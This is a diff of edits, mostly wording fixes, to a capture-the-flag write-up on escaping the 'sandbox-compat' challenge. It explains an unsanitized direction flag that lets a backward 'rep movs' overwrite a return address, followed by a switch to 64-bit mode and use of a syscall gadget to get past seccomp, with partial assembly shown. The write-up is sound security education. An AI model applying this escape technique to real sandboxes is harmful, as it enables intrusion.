@@ -5,7 +5,7 @@
 In the task we get [64-bit Linux executable](sandbox) of the server application with its full source code.
 
 The challenge name and description suggest that the application implements a sandbox.
-Addition details presented once we connect confirm this:
+Additional details presented once we connect confirm this:
 ```
 $ nc sandbox-compat.ctfcompetition.com 1337
 beef0000-bef00000 rw-p 00000000 00:00 0 
@@ -36,7 +36,7 @@ int main(void)
 }
 ```
 
-Now, we can now examine each of the above steps.
+Now, we can examine each of the steps.
 
 ### Userland Setup
 
@@ -65,7 +65,7 @@ and making it available for the current processes:
 The local descriptor table is a data structure used by x86-family to define memory areas available for the program.
 
 When `modify_ldt` is called, the Linux kernel validates the passed structure and creates new descriptor table for our process.
-By loading the corresponding segment selector into CS segment register, the process is be able to execute 32-bit code within our 64-bit process.
+By loading the corresponding segment selector into CS segment register, the processor is be able to execute 32-bit code within our 64-bit process.
 
 The value of segment selector encodes entry_number, which of the tables to use and requested privilege level:
 ```
@@ -76,15 +76,16 @@ struct selector {
 };
 ```
 
-Relevant selectors values are:
-* 0x0F for new descriptor (requested_privilege_level=3, table=1, entry_number=1)
+Selector values relavant for our application are:
+* 0x0F for the registered descriptor (requested_privilege_level=3, table=1, entry_number=1)
 * 0x33 for standard descriptor GDT_ENTRY_DEFAULT_USER_CS
+
 By loading these descriptors, the application can switch between 32-bit and 64-bit mode.
 
 A hidden detail in the sandbox source code is implicit initialization of `user_desc.lm` field that actually controls if the code should execute as 64-bit or 32-bit.
-Fortunately the field is initialized as 0 with `memset`.
+Fortunately the field is initialized as zero with `memset`.
 
-Next, the subroutine prepares page with the following trampoline code at the end of 32-bit address space 0xFFFFF000 with permissions PROT_READ | PROT_EXEC:
+Next, the subroutine prepares page with the following trampoline code at the end of 32-bit address space, setting permissions PROT_READ | PROT_EXEC:
 ```
 BITS 32
 
@@ -118,7 +119,7 @@ Finally it allocates pages for userland code and stack:
 
 ### Kernelland Setup
 
-The subroutine `setup_kernelland` allocates single page to store kernel code directly following user-mode trampoline.
+The subroutine `setup_kernelland` allocates single page to store kernelland entry code directly following user-mode trampoline.
 
 It also allocates single page for kernel stack at non-fixed address:
 ```
@@ -127,10 +128,10 @@ It also allocates single page for kernel stack at non-fixed address:
   if (stack == MAP_FAILED)
     err(1, "mmap");
 ```
-In case when the Linux kernel allocates this page in low 4 GBytes, the untrusted sandbox code could read and control content of 64-bit stack.
+In case when the Linux kernel allocates this page in low 4 GBytes, the untrusted sandbox code could potentially access and modify content of 64-bit stack.
 However this issue is not explotaible:
-* I'm pretty sure that Linux kernel would not allocate that page in low memory at this point of process execution,
-* Even if such allocation would happen, the application will detect it in `check_proc_maps` as will be described later.
+* I'm pretty sure that Linux kernel would not allocate such page in low memory at this point of process execution,
+* Even if such allocation would happen, the application will detect it later in `check_proc_maps` as will be describe bellow.
 
 The kernel code directly following user-mode trampoline looks like that:
 ```
@@ -173,7 +174,7 @@ bad:
 Where called `kernel` subroutine is implemented in C.
 
 A very important observation about the above code is that content of `flags` register is not sanitized on transistion from userland to kernelland.
-This will lead to sucessful explitation that I will demonstrate later.
+This will lead to sucessful explitation that I will demonstrate.
 
 The called kernel implements following calls from userland:
 * `__NR_read` enforcing all of read buffer within low 4 GBytes
@@ -200,9 +201,9 @@ The subroutine `install_seccomp` configures limit for creation of new processes:
   if (setrlimit(RLIMIT_NPROC, &limit) != 0)
     err(1, "setrlimit");
 ```
-that is enforced by Linux kernel for non-root processes only.
+That will block creation of new processes by non-root users.
 
-Next, it also installs SECCOMP filter:
+Next, it installs SECCOMP filter:
 ```
   if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0)
     err(1, "prctl(NO_NEW_PRIVS)");
@@ -238,7 +239,7 @@ fffff000-100001000 r-xp 00000000 00:00 0
  0016: 0x06 0x00 0x00 0x00000000  return KILL
 ```
 
-The important observation here is that `instruction_pointer` reliably prevents any syscalls from low 4 GBytes.
+The important observation here is that `instruction_pointer` reliably prevents any syscalls from code executing in low 4 GBytes.
 
 ## Starting User Code
 
@@ -276,10 +277,10 @@ static struct opcode { char *name; char opcode; } opcodes[] = {
 ```
 This blocks all well-known instructions to reload CS segment register.
 
-In case CS segment register could be loaded within userland code, e.g. due to potential validation bugs, by using less-known or undocumented instructions or via self-modifying code, we could bypass restrictions on `__NR_open` and `__NR_mprotect` that are implemented by kernelmode.
-I didn't indentify any method to perform such CS reload.
+In case CS segment register could be somehow loaded by user code, e.g. due to potential validation bugs, by using less-known or undocumented instructions or via self-modifying code, we could bypass restrictions on `__NR_open` and `__NR_mprotect` that are implemented by kernelmode.
+I wasn't able to indentify any method to perform such CS reload.
 
-Next, the subroutine copies validate code to userland page and sets permissions to ensure that code cannot be modified:
+Next, the subroutine copies validated code to userland code page and sets permissions to ensure that code cannot be modified:
 ```
   if (mprotect(USER_CODE, PAGE_SIZE, PROT_READ | PROT_EXEC) != 0)
     err(1, "mprotect");
@@ -288,9 +289,10 @@ Next, the subroutine copies validate code to userland page and sets permissions 
 ## Exploitation
 
 I identified only one issue during code review, where the `flags` register is not sanitized during transistion from userland to kernelland.
-The potential exploitation scenario is setting `direction flag` (DF) in order to change semantics of some string instructions during kernelland execution.
 
-Searching for `rep` prefix in provided binary gives interesting fragment in `path_ok` subroutine:
+The potential exploitation scenario is setting `direction flag` (DF) in order to change semantics of some *string instructions* during kernelland execution.
+
+Searching for `rep` prefix in provided binary gives interesting fragment from `path_ok` subroutine:
 ```
 0000000000001340 <path_ok.part.0>:
     ...
@@ -315,11 +317,11 @@ int path_ok(char *pathname, const char *p)
 
 The passed `pathname` buffer is allocated on `op_open` stack frame.
 With `direction flag` set, the `rep movs` code decrements `rdi` and `rsi` registers on each iteration.
-The code starts copying userland-supplied data into start of `pathname` and continue to loader stack addresses, outside of allocated `pathname`.
-Here the userland can control over 200 bytes (almost MAX_PATH) outside of stack allocted buffer.
+After coping the first qword of userland-supplied data into start of `pathname`, it continues to preceding stack addresses.
+This vulnerability allows for controlling over 200 bytes (almost MAX_PATH) on stack just before allocated `pathname` buffer.
 
 Running sandbox under debugger with trivial PoC userland code confirm ability to overwrite `op_open` return address.
-This can be exploted as follows in order to execute user-supplied 64-bit code:
+This can be exploted as follows to execute user-supplied code in 64-bit mode:
 ```
         entry:
             mov     esp, 0xbef00000
@@ -335,16 +337,17 @@ This can be exploted as follows in order to execute user-supplied 64-bit code:
             push    eax
             ret
         hijack_64:
+            /* Any code to execute in 64-bit mode */
 ```
 
-Once in 64-bit mode, we can bypass SECCOMP `instruction_pointer` rule by executing pre-existing gadgets locted above 4 GBytes.
-One of available gadgets is `syscall@plt` from sandbox code itself:
+Once in 64-bit mode, we can bypass SECCOMP `instruction_pointer` rule by executing pre-existing gadgets located above 4 GBytes.
+One of the available gadgets is `syscall@plt` from the sandbox binary:
 ```
 0000000000000ce0 <syscall@plt>:
  ce0:   ff 25 9a 22 20 00       jmp    QWORD PTR [rip+0x20229a]        # 202f80 <syscall@GLIBC_2.2.5>
 ```
 
-Remaining part of user-supplied code to read `flag` file:
+Using this gadget we can construct following code to read `flag` file:
 ```
         hijack_64:
             movabs  rax, 0x10000001e            /* address of kernel subroutine in kernelland entry page */
